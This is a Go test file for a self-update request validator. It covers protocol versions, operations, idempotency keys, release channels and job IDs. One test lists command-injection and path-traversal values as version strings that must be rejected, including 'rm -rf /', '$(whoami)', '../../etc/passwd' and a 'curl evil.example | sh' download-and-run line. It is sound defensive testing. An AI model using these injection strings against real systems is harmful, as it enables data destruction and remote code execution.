package selfupdate

import "testing"

func TestRequestValidate_RejectsUnknownOperation(t *testing.T) {
	r := Request{ProtocolVersion: ProtocolVersion, Op: Operation("delete_everything")}
	if err := r.Validate(); err != ErrUnknownOperation {
		t.Fatalf("expected ErrUnknownOperation, got %v", err)
	}
}

func TestRequestValidate_RejectsUnsupportedProtocolVersion(t *testing.T) {
	r := Request{ProtocolVersion: 999, Op: OpStatus}
	if err := r.Validate(); err != ErrUnsupportedProtoVersion {
		t.Fatalf("expected ErrUnsupportedProtoVersion, got %v", err)
	}
}

func TestRequestValidate_RequiresIdempotencyKeyForInstall(t *testing.T) {
	r := Request{ProtocolVersion: ProtocolVersion, Op: OpStartInstall, RequestedVersion: "1.0.4"}
	if err := r.Validate(); err != ErrMissingIdempotencyKey {
		t.Fatalf("expected ErrMissingIdempotencyKey, got %v", err)
	}
}

func TestRequestValidate_RequiresIdempotencyKeyForRollback(t *testing.T) {
	r := Request{ProtocolVersion: ProtocolVersion, Op: OpStartRollback}
	if err := r.Validate(); err != ErrMissingIdempotencyKey {
		t.Fatalf("expected ErrMissingIdempotencyKey, got %v", err)
	}
}

func TestRequestValidate_RejectsInjectionInRequestedVersion(t *testing.T) {
	cases := []string{
		"1.0.4; rm -rf /",
		"$(whoami)",
		"../../etc/passwd",
		"1.0.4 && curl evil.example | sh",
		"latest",
		"",
	}
	for _, v := range cases {
		r := Request{ProtocolVersion: ProtocolVersion, Op: OpStartInstall, IdempotencyKey: "k", RequestedVersion: v}
		if v == "" {
			// empty is allowed (means "install whatever CheckRelease last
			// resolved"); every non-empty malformed value must be rejected.
			continue
		}
		if err := r.Validate(); err == nil {
			t.Errorf("expected RequestedVersion %q to be rejected", v)
		}
	}
}

func TestRequestValidate_RejectsBadChannel(t *testing.T) {
	r := Request{ProtocolVersion: ProtocolVersion, Op: OpCheckRelease, Channel: "nightly-unofficial"}
	if err := r.Validate(); err == nil {
		t.Fatal("expected non-allow-listed channel to be rejected")
	}
}

func TestRequestValidate_AcceptsWellFormedStartInstall(t *testing.T) {
	r := Request{
		ProtocolVersion:  ProtocolVersion,
		Op:               OpStartInstall,
		IdempotencyKey:   "abc123",
		RequestedVersion: "1.0.5",
		Channel:          "stable",
	}
	if err := r.Validate(); err != nil {
		t.Fatalf("expected well-formed request to pass, got: %v", err)
	}
}

func TestRequestValidate_GetJobRequiresJobID(t *testing.T) {
	r := Request{ProtocolVersion: ProtocolVersion, Op: OpGetJob}
	if err := r.Validate(); err == nil {
		t.Fatal("expected missing job_id to be rejected for get_job")
	}
}
